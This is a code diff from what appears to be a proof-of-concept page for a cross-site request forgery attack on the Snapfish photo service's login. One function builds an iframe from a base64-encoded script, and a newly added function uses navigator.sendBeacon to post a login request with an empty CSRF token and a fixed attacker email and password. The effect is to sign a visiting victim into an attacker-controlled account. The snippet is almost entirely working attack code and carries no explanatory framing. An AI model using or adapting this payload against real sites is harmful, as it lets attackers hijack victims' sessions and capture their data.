@@ -11,7 +11,7 @@
             
         }
 
-        function step2(){
+        function step2a(){
             var attackerLoginFrame = document.createElement('iframe');
             attackerLoginFrame.setAttribute('src', 'data:text/html;base64,PHNjcmlwdD4KICAgICAgICAgICAgdmFyIGJvZHkgPSAiaXdQcmVBY3Rpb25zPXN1Ym1pdCZwbnNVcmw9JTJGbG9naW50byZuZXh0PWh0dHBzJTI1M0ElMjUyRiUyNTJGd3d3LnNuYXBmaXNoLmNvbSUyNTJGaG9tZSUyNTNGbG9naW53aXRoJTI1M0RlbWFpbCZTRUNVUklUWV9DU1JGVE9LRU49JlN1YnNjcmlwdGlvbkZsYWc9Y2hlY2tlZCZFbWFpbEFkZHJlc3M9YXR0YWNrZXJvcW4zdmclNDBraGFyYS5vbmUmUGFzc3dvcmQ9TmV3UGFzc3dvcmQlMjEyMDI0IjsKICAgICAgICAgICAgdmFyIGFCb2R5ID0gbmV3IFVpbnQ4QXJyYXkoYm9keS5sZW5ndGgpOwogICAgICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IGFCb2R5Lmxlbmd0aDsgaSsrKQogICAgICAgICAgICBhQm9keVtpXSA9IGJvZHkuY2hhckNvZGVBdChpKTsgCgoKICAgICAgICAgICAgbmF2aWdhdG9yLnNlbmRCZWFjb24oImh0dHBzOlwvXC93d3cuc25hcGZpc2guY29tXC9sb2dpbnRvP3N1Ym1pdD10cnVlJmNvbXBvbmVudElEPTEzOTU4NjgwMDQ1NzEiLCBuZXcgQmxvYihbYUJvZHldLCB7IHR5cGU6ICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiIH0pKQo8L3NjcmlwdD4=');
             attackerLoginFrame.setAttribute('width', '100px');
@@ -19,6 +19,16 @@
             attackerLoginFrame.setAttribute('sandbox', 'allow-scripts');
             //Log in to attacker account
             document.body.appendChild(attackerLoginFrame);
+        }
+
+        function step2(){
+            var body = "iwPreActions=submit&pnsUrl=%2Floginto&next=https%253A%252F%252Fwww.snapfish.com%252Fhome%253Floginwith%253Demail&SECURITY_CSRFTOKEN=&SubscriptionFlag=checked&EmailAddress=attackeroqn3vg%40khara.one&Password=NewPassword%212024";
+            var aBody = new Uint8Array(body.length);
+            for (var i = 0; i < aBody.length; i++)
+            aBody[i] = body.charCodeAt(i); 
+
+
+            navigator.sendBeacon("https:\/\/www.snapfish.com\/loginto?submit=true&componentID=1395868004571", new Blob([aBody], { type: "application/x-www-form-urlencoded" }))
         }
 
         function step3(){
